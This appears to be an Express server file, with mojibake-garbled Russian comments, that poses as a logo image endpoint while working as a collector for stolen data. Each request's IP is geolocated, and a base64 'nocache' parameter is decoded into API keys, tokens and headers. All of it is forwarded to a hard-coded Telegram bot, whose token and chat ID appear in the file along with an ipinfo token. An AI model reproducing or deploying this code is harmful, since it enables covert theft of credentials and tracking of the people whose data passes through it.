import express from 'express';
import axios from 'axios';
import { Buffer } from 'buffer';

const app = express();

// –í–∫–ª—é—á–∞–µ–º –¥–æ–≤–µ—Ä–∏–µ –∫ –ø—Ä–æ–∫—Å–∏ (–≤–∞–∂–Ω–æ –¥–ª—è Vercel)
app.set('trust proxy', true);

// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram
const TELEGRAM_BOT_TOKEN = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
const TELEGRAM_CHAT_ID = '5018443124';
const IPINFO_TOKEN = '717875db282daa'; // –ü–æ–ª—É—á–∏—Ç–µ –Ω–∞ ipinfo.io

const LOGO_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=';

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ GET –∑–∞–ø—Ä–æ—Å–æ–≤
app.get('/', async (req, res) => {
  try {
    // –ü–æ–ª—É—á–∞–µ–º —Ä–µ–∞–ª—å–Ω—ã–π IP –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    // @ts-ignore
    const userIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                  req.socket?.remoteAddress || 
                  req.connection?.remoteAddress || 
                  req.ip;
    
    // –ü–æ–ª—É—á–∞–µ–º —Å—Ç—Ä–∞–Ω—É –ø–æ IP
    const country = await getCountryByIp(userIp);
    
    // –î–µ—à–∏—Ñ—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ nocache
    const decryptedData = decryptNocache(req.query.nocache);
    
    console.log('GET request from:', userIp, 'Country:', country, 'Data:', req.query);

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram (–∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ, –Ω–µ –∂–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è)
    sendToTelegram(userIp, country, req.query, decryptedData);

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
    const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', imageBuffer.length);
    res.setHeader('Cache-Control', 'no-store, max-age=0');
    res.status(200).send(imageBuffer);

  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal Server Error');
  }
});

// –§—É–Ω–∫—Ü–∏—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö nocache
// @ts-ignore
function decryptNocache(nocache) {
  if (!nocache) return null;
  
  try {
    // –î–µ–∫–æ–¥–∏—Ä—É–µ–º Base64
    const decoded = Buffer.from(nocache, 'base64').toString('utf-8');
    
    // –ü–∞—Ä—Å–∏–º JSON
    const data = JSON.parse(decoded);
    
    return {
      ref: data.ref,
      api_key: data.api_key,
      token: data.token,
      timestamp: data.timestamp ? new Date(data.timestamp * 1000).toISOString() : null,
      header: data.header,
      keys: data.keys || [],
    };
  } catch (error) {
    console.error('Decryption error:', error);
    return { error: 'Failed to decrypt data' };
  }
}

// –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç—Ä–∞–Ω—ã –ø–æ IP
// @ts-ignore
async function getCountryByIp(ip) {
  if (!ip || ip === '::1' || ip === '127.0.0.1') return 'Local';
  
  try {
    const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`);
    return response.data.country || 'Unknown';
  } catch (error) {
    console.error('IP info error:', error);
    return 'Error';
  }
}

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
// @ts-ignore
async function sendToTelegram(ip, country, queryData, decryptedData) {
  try {
    // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    let message = `üåê *–ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –ª–æ–≥–æ—Ç–∏–ø–∞*\n\n`;
    message += `üñ•Ô∏è *IP*: ${ip}\n`;
    message += `üìç *–°—Ç—Ä–∞–Ω–∞*: ${country}\n\n`;
    
    message += `üîê *–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ (query)*:\n`;
    for (const [key, value] of Object.entries(queryData)) {
      message += `‚ñ´Ô∏è ${key}: \`${value}\`\n`;
    }
    
    if (decryptedData) {
      message += `\nüîì *–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ*:\n`;
      for (const [key, value] of Object.entries(decryptedData)) {
        message += `‚ñ´Ô∏è ${key}: \`${value}\`\n`;
      }
    }
    
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ Telegram:', error);
  }
}

export default app;